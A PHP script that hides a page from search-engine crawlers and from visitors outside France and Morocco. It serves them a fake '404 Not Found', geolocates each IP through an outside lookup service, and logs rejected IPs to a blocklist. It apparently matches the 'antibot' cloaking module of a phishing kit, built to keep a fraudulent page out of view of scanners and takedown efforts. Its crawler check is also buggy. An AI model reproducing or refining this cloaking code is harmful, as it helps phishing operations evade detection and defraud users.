<?php

$crawlers = array(
    'Google'=>'Google',
    'MSN' => 'msnbot',
    'Rambler'=>'Rambler',
    'Yahoo'=> 'Yahoo',
    'AbachoBOT'=> 'AbachoBOT',
    'accoona'=> 'Accoona',
    'AcoiRobot'=> 'AcoiRobot',
    'ASPSeek'=> 'ASPSeek',
    'CrocCrawler'=> 'CrocCrawler',
    'Dumbot'=> 'Dumbot',
    'FAST-WebCrawler'=> 'FAST-WebCrawler',
    'GeonaBot'=> 'GeonaBot',
    'Gigabot'=> 'Gigabot',
    'Lycos spider'=> 'Lycos',
    'MSRBOT'=> 'MSRBOT',
    'Altavista robot'=> 'Scooter',
    'AltaVista robot'=> 'Altavista',
    'ID-Search Bot'=> 'IDBot',
    'eStyle Bot'=> 'eStyle',
    'Scrubby robot'=> 'Scrubby',
    );
 
function crawlerDetect($USER_AGENT)
{
    // to get crawlers string used in function uncomment it
    // it is better to save it in string than use implode every time
    // global $crawlers
    // $crawlers_agents = implode('|',$crawlers);
    $crawlers_agents = 'Google|msnbot|Rambler|Yahoo|AbachoBOT|accoona|AcioRobot|ASPSeek|CocoCrawler|Dumbot|FAST-WebCrawler|GeonaBot|Gigabot|Lycos|MSRBOT|Scooter|AltaVista|IDBot|eStyle|Scrubby';
 
    if ( strpos($crawlers_agents , $USER_AGENT) === false )
       return false;
    // crawler detected
    // you can use it to return its name
    /*
    else {
       return array_search($USER_AGENT, $crawlers);
    }
    */
}
 
// example
 
$crawler = crawlerDetect($_SERVER['HTTP_USER_AGENT']);
 
if ($crawler )
{
   header('HTTP/1.0 404 Not Found');
   die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
else
{
   // usual visitor
}
function visitorip() 
{
	 if (getenv('HTTP_CLIENT_IP')){
         $ip = getenv('HTTP_CLIENT_IP');
		 }
     else if(getenv('HTTP_X_FORWARDED_FOR')) {
         $ip = getenv('HTTP_X_FORWARDED_FOR');
		 }
     else if(getenv('HTTP_X_FORWARDED')) {
         $ip = getenv('HTTP_X_FORWARDED');
		 }
     else if(getenv('HTTP_FORWARDED_FOR')) {
         $ip = getenv('HTTP_FORWARDED_FOR');
		 }
     else if(getenv('HTTP_FORWARDED')) {
        $ip = getenv('HTTP_FORWARDED');
		}
     else if(getenv('REMOTE_ADDR')) {
         $ip = getenv('REMOTE_ADDR');
		 }
     else {
         $ip = $_SERVER['HTTP_HOST'];
		 }
		 $ip=explode(",",$ip);
		 return $ip[0];
}


$ip=visitorip(); 




function regenerate() {
    $_SESSION['code'] = uniqid();
    $_SESSION['code_time'] = time();
}
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$md5=md5("$base"); 
$country = array('FR', 'MA');

$bots = "bots.txt";
$lines = file($bots, FILE_IGNORE_NEW_LINES);
$found = false;
foreach ($lines as $line){
    if (strpos($ip,$line) !== false){
        $found = true;
        break;
    }
}
if ($found){
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}else{
	$url="http://extreme-ip-lookup.com/json/$ip";
	$ch = curl_init(); 
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
	curl_setopt($ch, CURLOPT_TIMEOUT, 0);
	curl_setopt	($ch, CURLOPT_HEADER, 0);    
	curl_setopt	($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt	($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_REFERER, $url);
	// curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt	($ch, CURLOPT_URL, $url);
	$getinfo = curl_exec($ch);
	// echo $getinfo;
	$getinfo = json_decode($getinfo,true);
	// echo $getinfo;
	$country_code = $getinfo['countryCode'];
	if ( in_array($country_code, $country)){
		$client = "client.txt";
$lines = file($client, FILE_IGNORE_NEW_LINES);
		}else { header('HTTP/1.0 404 Not Found');
		file_put_contents($bots,"$ip\r\n",FILE_APPEND);
		echo $getinfo;
				die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
		}
}
?>